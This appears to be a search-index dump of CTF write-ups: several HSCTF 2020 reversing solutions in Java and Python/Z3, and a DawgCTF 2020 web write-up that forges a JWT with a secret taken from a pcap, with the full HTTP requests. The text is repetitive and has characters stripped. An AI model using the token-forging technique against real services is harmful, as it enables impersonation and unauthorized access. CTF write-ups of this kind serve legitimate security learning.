public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals( inagzgkpm)Wl Tg io )) { System.out.println( Correct. Your input is the flag. ); } else { System.out.println( Your input is incorrect. ); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl Tg io\" Give: flag{intr0_t0_r3v}","title":"ComputerScience"},{"location":"reversing/HSCTF7/ComputerScience/#aplabcomputer-science-principle-hsctf","text":"","title":"APLab:Computer Science principle HSCTF"},{"location":"reversing/HSCTF7/ComputerScience/#description","text":"A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals( inagzgkpm)Wl Tg io )) { System.out.println( Correct. Your input is the flag. ); } else { System.out.println( Your input is incorrect. ); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl Tg io\" Give: flag{intr0_t0_r3v}","title":"Description"},{"location":"reversing/HSCTF7/Dis/","text":"Dis HSCTF2020 Description The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3. Solution bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#dis-hsctf2020","text":"","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#description","text":"The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3.","title":"Description"},{"location":"reversing/HSCTF7/Dis/#solution","text":"bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Solution"},{"location":"reversing/HSCTF7/Statistics/","text":"APLab:Statistics HSCTF Description A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge. Solution import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring= qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba String com = fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey ; String guess = abcdefghijklmnopqrstuvwxyz{_}| ; System.out.print( f ); for (int i = 1 ; i com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#aplabstatistics-hsctf","text":"","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#description","text":"A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge.","title":"Description"},{"location":"reversing/HSCTF7/Statistics/#solution","text":"import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring= qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba String com = fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey ; String guess = abcdefghijklmnopqrstuvwxyz{_}| ; System.out.print( f ); for (int i = 1 ; i com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"Solution"},{"location":"web/intro/","text":"Web Exploitaion Introduction \"Write about Reverse Engineering and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2","title":"Web Exploitaion"},{"location":"web/intro/#web-exploitaion","text":"","title":"Web Exploitaion"},{"location":"web/intro/#introduction","text":"\"Write about Reverse Engineering and about the writeups\"","title":"Introduction"},{"location":"web/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2","title":"The contents of this repo"},{"location":"web/DawgCTF20/freewifi2/","text":"FreeWifi2 There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: JWT 'identity'=31337 HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M username=true.grit%40umbccd.io password=true.grit%40umbccd.io submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666 Ideas: I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'= dawgCTF?heckin#bamboozle ; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Freewifi2"},{"location":"web/DawgCTF20/freewifi2/#freewifi2","text":"There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: JWT 'identity'=31337 HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M username=true.grit%40umbccd.io password=true.grit%40umbccd.io submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666","title":"FreeWifi2"},{"location":"web/DawgCTF20/freewifi2/#ideas","text":"I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'= dawgCTF?heckin#bamboozle ; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Ideas:"}]}